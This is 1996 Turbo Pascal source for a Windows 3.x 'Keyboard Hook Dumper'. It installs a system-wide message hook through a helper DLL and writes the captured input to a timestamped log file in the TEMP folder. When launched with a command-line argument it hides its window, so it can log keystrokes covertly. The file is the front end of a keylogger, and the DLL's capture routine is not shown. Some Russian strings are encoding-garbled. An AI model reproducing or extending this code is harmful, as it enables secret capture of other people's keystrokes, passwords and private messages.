
program HookDump;

{$D (C),96 iLya Osipov -=- HookDump v3.1 -=- ilya@kis.ru}
{$R HookDump}

uses WinTypes, WinProcs, Strings, ioGDI, WinCrt, WinDos;

const
  AppName = 'iLyaProg_HookDump';
  DllName = 'HookDmp';

const
  idm_About = 100;
var
  F:file;
  dir,st:String;
  dY,dM,dD,dDW,dH,dMM,dS,dS100:Word;

const
    R_on=1;
    R_off=0;
    R_Not=$FF;

Procedure SETlpfnNextHook(P:TFarProc);
  Far; external DllName index 2;
Function OpenDump(F,Z:String):Boolean;
  Far; external DllName index 3;
Function CloseDump(Z:String):Boolean;
  Far; external DllName index 4;
Procedure RegisterRusInd(Wnd:HWnd);
  Far; external DllName index 5;


Procedure DrawWinDC(PaintDC:HDC; var PaintInfo: TPaintStruct);
  Begin
    DrawBitMapAL(PaintDC,19+1,0,216,20,HInstance,'wintit')
  End;

Function IntToStr(I:Integer):String;
var S:String;
begin
  str(i,S);
  if Length(S)=1 Then S:='0'+S;
  IntToStr:=S;
end;


const dow: array [0..7] of string[3] =
      ('Sun','Mon','Tue','Wed','Thu','Fri','Sat','Sun');

Function Date:String;
begin
  GetDate(dY,dM,dD,dDW);
  Date:=inttostr(dY)+'-'+inttostr(dM)+'-'+inttostr(dD)+'\'+dow[dDW];
end;


Function Time:String;
begin
  GetTime(dH,dMM,dS,dS100);
  Time:=inttostr(dH)+':'+inttostr(dMM);
end;



Procedure DrawIconic(PaintDC:HDC; var PaintInfo: TPaintStruct);
  Var
    IconBits,OldBitmap:HBitmap;
    MemDC:HDC;
    x,y,xx,yy : Integer;
    Color: TColorRef;
  Begin
     {if GetRus
     Then
      DrawBitMapAL(PaintDC,0,0,36,36,HInstance,'Rus')
     Else
      DrawBitMapAL(PaintDC,0,0,36,36,HInstance,'Lat');}
  End;


Procedure SysMenuEdit(Window:HWnd);
  var
    SysM:HMenu;
    i:Word;
  Begin
    SysM:=GetSystemMenu(Window,False);
    {for i:=0 to GetMenuItemCount(SysM)-1 do
    begin
      DeleteMenu(SysM,0,mf_ByPosition);
    end;}
    DeleteMenu(SysM,2,mf_ByPosition);
    DeleteMenu(SysM,3,mf_ByPosition);
    {DeleteMenu(SysM,2,mf_ByPosition);}
  End;

Procedure Draw(PaintDC:HDC; var PaintInfo: TPaintStruct);
  Var
    IconBits,OldBitmap:HBitmap;
    MemDC:HDC;
    x,y,xx,yy : Integer;
    Color: TColorRef;
    St:String;
  Begin
     St:='"Keyboard Hook Dumper" (c),96 iLya E-Mail:ilya@kis.ru';
     TextOut(PaintDC,10,5,@st[1],Byte(st[0]));
     St:='Enter dir in command string';
     TextOut(PaintDC,10,25,@st[1],Byte(st[0]));
     St:='Now using dir\file: "'+dir+'"';
     TextOut(PaintDC,10,45,@st[1],Byte(st[0]));
     St:='Óêaæèòe paáo÷óþ äèðeêòopèþ â koìaíäíoé còpoêe';
     TextOut(PaintDC,10,65,@st[1],Byte(st[0]));
  End;
                   {pascal}



{****************************************************************}
Var
  PaintDC: HDC;
  WinDC: HDC;
  PaintInfo: TPaintStruct;

function WindowProc(Window: HWnd; Message, WParam: Word;
  LParam: Longint): Longint; export;
var
  xPos,yPos:Word;
begin
  WindowProc := 0;
  case Message of

    {WM_NCRBUTTONDBLCLK,
    WM_RBUTTONDBLCLK,
    wm_RBUTTONDOWN,
    wm_NCRBUTTONDOWN:
       begin
         xPos := LOWORD(lParam);    (* horizontal position of cursor *)
         yPos := HIWORD(lParam);    (* vertical position of cursor   *)
         SetRus(R_not);
         InvalidateRect(Window,nil,False);
         Exit;
       end;}
    wm_Destroy:
      begin
        CloseDump(#13'[Normal end of log file. '+Time+']');
        PostQuitMessage(0);
        Exit;
      end;
    wm_Paint:
      begin
        PaintDC:=BeginPaint(Window,PaintInfo);
        if isIconic(Window)
          then DrawIconic(PaintDC,PaintInfo)
          else Draw(PaintDC,PaintInfo);
        EndPaint(Window,PaintInfo);
        Exit;
      end;
    wm_NCPaint:
      begin
        WindowProc := DefWindowProc(Window, Message, WParam, LParam);
        WinDC:=GetWindowDC(Window);
        if isIconic(Window)
          then DrawIconic(WinDC,PaintInfo)
          else DrawWinDC(WinDC,PaintInfo);
        ReleaseDC(Window,WinDC);
        Exit;
      end;

    wm_Create:
      Begin
        OpenDump(dir,'[It''s a log file '+Date+' '+Time+']'#13);
        SysMenuEdit(Window);
      end;
  end;
  WindowProc := DefWindowProc(Window, Message, WParam, LParam);
end;

Var hHookDLL:THandle;

procedure WinMain;
var
  Window:  HWnd;
  Message: TMsg;
  Result:  Integer;
  P:       Pointer;
const
  WindowClass: TWndClass = (
    style: 0;
    lpfnWndProc: @WindowProc;
    cbClsExtra: 0;
    cbWndExtra: 0;
    hInstance: 0;
    hIcon: 0;
    hCursor: 0;
    hbrBackground: 0;
    lpszMenuName: nil{'MENU'};
    lpszClassName: AppName);
{it's a test itadrt}
begin
  if ParamCount=0 Then begin
    dir:={'C:\Temp\'} strpas(GetEnvVar('TEMP'));
    end
  else
  begin
    dir:=ParamStr(1);
    if dir[length(dir)]<>'\' then dir:=dir+'\';
  end;
  GetDate(dY,dM,dD,dDW);
  GetTime(dH,dMM,dS,dS100);
  dir:=dir+inttostr(dM)+inttostr(dD)+inttostr(dH)+inttostr(dMM)+'.hk';



  if HPrevInst = 0 then
  begin
    WindowClass.hInstance := HInstance;
    WindowClass.hIcon := LoadIcon(HInstance,'ICON_1');
    WindowClass.hCursor := LoadCursor(0, idc_Arrow);
    WindowClass.hbrBackground := HBrush(color_AppWorkSpace+1);
    {GetStockObject(white_Brush);}
    if not RegisterClass(WindowClass) then Halt(255);
  end;
  Window := CreateWindow(
    AppName,
    'Hook Dump',
    {ws_PopUp}
    ws_OverlappedWindow and not ( WS_THICKFRAME or WS_MAXIMIZEBOX),
    {WS_Iconic,}
    cw_UseDefault,
    cw_UseDefault,
    {cw_UseDefault}{350}256+200,
    {cw_UseDefault}{350}128,
    0,
    0,
    HInstance,
    nil);

  if ParamCount=0 Then begin
    ShowWindow(Window,SW_SHOW{SW_ShowMinimized});
    end
  else begin
    ShowWindow(Window,SW_Hide{SW_ShowMinimized});
  end;
  {Ïðèâåò}

  UpdateWindow(Window);

  {Init Hook -----}
  hHookDLL:=LoadLibrary(DllName+'.dll');
  if hHookDLL<32 Then MessageBox(GetFocus,' Lib-Error ','HookDMP.dll not found',mb_Ok);
  P:=GetProcAddress(hHookDLL,'MsgHookProc');
  if P=nil Then MessageBox(GetFocus,' Func ','Function MsgHookProc not found in HookDMP.dll',mb_Ok);
  SETlpfnNextHook(SetWindowsHook(WH_GETMESSAGE,P));
  RegisterRusInd(Window);

  while GetMessage(Message, 0, 0, 0) do
  begin
    TranslateMessage(Message);
    DispatchMessage(Message);
  end;


  {DONE Hook}
  UnhookWindowsHook(WH_GETMESSAGE,P);
  FreeLibrary(hHookDLL);
  FreeLibrary(hHookDLL);
  FreeLibrary(hHookDLL);


  Halt(Message.wParam);
end;



begin
  WinMain;
end.;
